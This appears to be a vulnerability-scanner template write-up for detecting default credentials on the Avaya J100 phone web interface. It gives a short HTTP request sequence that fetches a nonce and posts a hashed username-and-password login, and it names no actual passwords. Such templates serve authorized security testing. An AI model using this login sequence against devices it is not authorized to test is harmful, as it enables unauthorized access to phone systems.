# Nuclei Template: Avaya Phone Web Interface - Default Login
**Template ID:** avaya-phone-default-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** High
**CWE:** CWE-1392
**Source:** Nuclei Template (`avaya-phone-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Avaya phone web interface contains a default login vulnerability. An attacker can obtain access to sensitive information, modify data, and/or execute unauthorized operations.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/cgi-bin/J100WebServer.cgi?Operation=0
POST /cgi-bin/J100WebServer.cgi?Operation=1 HTTP/1.1
Host: {{Host}}
Content-Type: application/x-www-form-urlencoded

uname={{username}}&psw={{sha256(concat(password,nonce))}}
```

## References
- https://documentation.avaya.com/bundle/InstallandadminJ100seriesIPPhone_r4.1.x/page/Logging_into_web_UI.html
